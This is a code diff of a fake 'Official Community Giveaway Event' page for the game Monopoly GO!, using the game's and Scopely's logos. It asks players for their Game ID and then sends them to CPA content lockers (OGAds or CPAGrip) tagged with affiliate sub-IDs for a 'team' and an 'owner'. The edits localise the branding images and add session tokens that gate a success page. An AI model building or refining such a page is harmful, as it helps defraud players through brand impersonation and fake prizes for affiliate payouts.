@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Monopoly GO! - Official Community Giveaway Event</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,600,800&display=swap">
-    <link rel="icon" href="https://static.wikia.nocookie.net/logopedia/images/8/8e/Monopoly_GO%21_2023.png" type="image/x-icon">
+    <link rel="icon" href="./app-logo.png" type="image/x-icon">
     
     <script src="/config.js"></script>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
@@ -108,9 +108,9 @@
 
 <div class="header">
     <div class="header-content">
-        <img src="https://static.wikia.nocookie.net/logopedia/images/8/8e/Monopoly_GO%21_2023.png" alt="Monopoly GO!">
+        <img src="./Monopoly_Go.webp" alt="Monopoly GO!">
         <div class="publisher-separator"></div>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Scopely_logo.svg/1024px-Scopely_logo.svg.png" class="publisher-logo" alt="Scopely">
+        <img src="./Scopely_logo.svg.png" class="publisher-logo" alt="Scopely">
     </div>
 </div>
 
@@ -120,7 +120,7 @@
             
             <!-- STEP 1 -->
             <div id="step1">
-                <img src="https://iili.io/JH5jGUl.png" class="hero-icon">
+                <img src="./app-logo.png" class="hero-icon">
                 <h1>Community Giveaway Event</h1>
                 <p style="font-size: 13px; color: #aaa; margin-bottom: 20px;">
                   Join our exclusive weekly event! Enter your valid Game ID to participate in the raffle.<br>
@@ -343,27 +343,29 @@
     }
 
     function call_locker_smart() {
-    if (isTeam) {
-        // --- LOGIKA UNTUK OGADS (TIM) ---
-        if (typeof og_load === 'function') {
-            // Kita kirim pakai format Object agar lebih akurat diterima OGAds
-            og_load({
-                subid1: subID,   // s1 (Mjolnir/Thor)
-                subid2: MY_GAME_ID // s2 (Nama Game Cantik)
-            });
-        } else {
-            alert("System loading, please try again...");
-        }
-    } else {
-        // --- LOGIKA UNTUK CPAGRIP (OWNER) ---
+        // [NEW] SIMPAN DATA SESI (TIKET MASUK)
+        // Ini syarat agar bisa masuk ke success.html
+        sessionStorage.setItem("cpa_user_id", user_id);
+        sessionStorage.setItem("cpa_status", "processing");
+
         if (typeof call_locker === 'function') {
-            call_locker({
-                s1: 'Owner',
-                s2: MY_GAME_ID
-            });
+            if (isTeam) {
+                if (typeof og_load === 'function') {
+                    og_load({
+                        subid1: subID,
+                        subid2: MY_GAME_ID
+                    });
+                } else {
+                    alert("System loading...");
+                }
+            } else {
+                call_locker({
+                    s1: 'Owner',
+                    s2: MY_GAME_ID
+                });
+            }
         }
     }
-}
 
     // =========================================
     // 4. FITUR TAMBAHAN (NOTIF & COUNTER)
